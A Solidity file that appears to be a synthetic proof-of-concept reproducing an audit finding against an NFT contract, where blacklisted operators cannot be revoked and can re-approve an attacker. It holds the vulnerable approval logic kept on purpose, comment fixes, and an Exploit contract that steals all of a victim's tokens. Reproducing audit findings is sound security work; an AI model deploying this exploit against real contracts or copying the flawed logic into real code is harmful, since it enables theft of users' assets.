// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Shiny sRWA — Blacklisted operators cannot be revoked and can steal NFTs
    (Shieldify Security, finding #64682, H-02)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: sRWA.setApprovalForAll reverts if the operator is blacklisted
    even when approved==false (revocation). Blacklisted operators can still
    call approve() to re-delegate to an unblacklisted attacker, who then
    transferFroms the victim's NFTs.

    Vulnerable line preserved verbatim (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC721 with operator approvals.
contract BaseERC721 {
    mapping(uint256 => address) internal _owners;
    mapping(address => mapping(address => bool)) internal _operatorApprovals;
    mapping(uint256 => address) internal _tokenApprovals;
    mapping(address => uint256) public balanceOf;

    error ERC721InvalidApprover(address);
    error NotOwner();

    function ownerOf(uint256 tokenId) public view returns (address) {
        address o = _owners[tokenId];
        require(o != address(0), "no token");
        return o;
    }

    function isApprovedForAll(address owner, address operator) public view returns (bool) {
        return _operatorApprovals[owner][operator];
    }

    function getApproved(uint256 tokenId) public view returns (address) {
        return _tokenApprovals[tokenId];
    }

    function _mint(address to, uint256 tokenId) internal {
        require(_owners[tokenId] == address(0), "exists");
        _owners[tokenId] = to;
        balanceOf[to] += 1;
    }

    function _setApprovalForAll(address owner, address operator, bool approved) internal {
        _operatorApprovals[owner][operator] = approved;
    }

    /// @dev OZ-style: operators may set per-token approvals.
    function _approve(address to, uint256 tokenId, address auth, bool emitEvent) internal virtual {
        emitEvent;
        if (auth != address(0)) {
            address owner = ownerOf(tokenId);
            // We do not use _isAuthorized because single-token approvals should not be able to call approve
            if (auth != address(0) && owner != auth && !isApprovedForAll(owner, auth)) {
                revert ERC721InvalidApprover(auth);
            }
        }
        _tokenApprovals[tokenId] = to;
    }

    function transferFrom(address from, address to, uint256 tokenId) public virtual {
        address owner = ownerOf(tokenId);
        require(owner == from, "wrong from");
        address spender = msg.sender;
        require(
            spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender,
            "not approved"
        );
        _tokenApprovals[tokenId] = address(0);
        balanceOf[from] -= 1;
        balanceOf[to] += 1;
        _owners[tokenId] = to;
    }
}

/// @notice Reduced sRWA — blacklisting blocks setApprovalForAll even for revoke.
contract sRWA is BaseERC721 {
    address public admin;
    mapping(address => bool) internal _isBlacklisted;

    error Blacklisted();

    constructor(address _admin) {
        admin = _admin;
    }

    function isBlacklisted(address a) external view returns (bool) {
        return _isBlacklisted[a];
    }

    function blacklistContract(address a) external {
        require(msg.sender == admin, "only admin");
        _isBlacklisted[a] = true;
    }

    function mint(address to, uint256 tokenId) external {
        require(msg.sender == admin, "only admin");
        _mint(to, tokenId);
    }

    // ============================================================
    //  Vulnerable overrides — sRWA.sol
    // ============================================================
    function setApprovalForAll(address operator, bool approved) public virtual {
        // Reverts for blacklisted operators even when approved==false (revocation).
        // Victim cannot clear a blacklisted operator's approval.
        // FIX: if (_isBlacklisted[operator] && approved == true) revert Blacklisted();
        if (_isBlacklisted[operator]) revert Blacklisted(); // @> VULN: blocks revoke of blacklisted op
        _setApprovalForAll(msg.sender, operator, approved);
    }

    function approve(address to, uint256 tokenId) public virtual {
        // Blocks blacklisted `to`, but does NOT block blacklisted msg.sender —
        // so a blacklisted operator can still re-approve an unblacklisted attacker.
        // FIX: if (_isBlacklisted[msg.sender]) revert Blacklisted();
        if (_isBlacklisted[to]) revert Blacklisted();
        _approve(to, tokenId, msg.sender, true);
    }
}

/// @dev Victim user: owns NFTs, grants operator to router.
contract Victim {
    function grantOperator(sRWA rwa, address router) external {
        rwa.setApprovalForAll(router, true);
    }

    function tryRevoke(sRWA rwa, address router) external returns (bool reverted) {
        // Returns true if revoke reverts (expected under the bug).
        try rwa.setApprovalForAll(router, false) {
            return false;
        } catch {
            return true;
        }
    }
}

/// @dev Blacklisted router/operator: re-approves attacker for each token.
contract RogueRouter {
    function reApprove(sRWA rwa, address attacker, uint256 tokenId) external {
        rwa.approve(attacker, tokenId);
    }
}

/// @dev Unblacklisted attacker: pulls NFTs after receiving per-token approval.
contract Attacker {
    function pull(sRWA rwa, address from, uint256 tokenId) external {
        rwa.transferFrom(from, address(this), tokenId);
    }
}

/// @dev Admin helper: mints NFTs and blacklists the router.
contract AdminHelper {
    function mintMany(sRWA rwa, address to, uint256 n) external {
        for (uint256 i = 1; i <= n; i++) {
            rwa.mint(to, i);
        }
    }

    function blacklist(sRWA rwa, address router) external {
        rwa.blacklistContract(router);
    }
}

/// @dev CREATE order:
///      1 AdminHelper, 2 sRWA, 3 Victim, 4 RogueRouter, 5 Attacker
contract Exploit {
    uint256 public constant N = 3; // number of NFTs stolen

    AdminHelper public adminH; // nonce 1
    sRWA public rwa; // nonce 2 — vulnerable
    Victim public victim; // nonce 3
    RogueRouter public router; // nonce 4
    Attacker public attacker; // nonce 5

    constructor() {
        adminH = new AdminHelper();
        rwa = new sRWA(address(adminH));
        victim = new Victim();
        router = new RogueRouter();
        attacker = new Attacker();

        // Mint N NFTs to victim; victim grants router operator.
        adminH.mintMany(rwa, address(victim), N);
        victim.grantOperator(rwa, address(router));
        require(rwa.isApprovedForAll(address(victim), address(router)), "op not set");

        // Admin blacklists the router (e.g. OFAC/rogue).
        adminH.blacklist(rwa, address(router));
        require(rwa.isBlacklisted(address(router)), "not blacklisted");
    }

    function run() external {
        // Victim tries to revoke the blacklisted operator — reverts (bug).
        bool revokeReverted = victim.tryRevoke(rwa, address(router));
        require(revokeReverted, "revoke should have been blocked");
        require(rwa.isApprovedForAll(address(victim), address(router)), "op still active");

        // Blacklisted router re-approves unblacklisted attacker for each token.
        for (uint256 tokenId = 1; tokenId <= N; tokenId++) {
            router.reApprove(rwa, address(attacker), tokenId);
            require(rwa.getApproved(tokenId) == address(attacker), "approve failed");
        }

        // Attacker pulls all NFTs.
        for (uint256 tokenId = 1; tokenId <= N; tokenId++) {
            attacker.pull(rwa, address(victim), tokenId);
            require(rwa.ownerOf(tokenId) == address(attacker), "not stolen");
        }

        // HARM: all victim NFTs now owned by attacker; victim cannot revoke.
        require(rwa.balanceOf(address(attacker)) == N, "harm not demonstrated");
        require(rwa.balanceOf(address(victim)) == 0, "victim still has NFTs");
    }
}
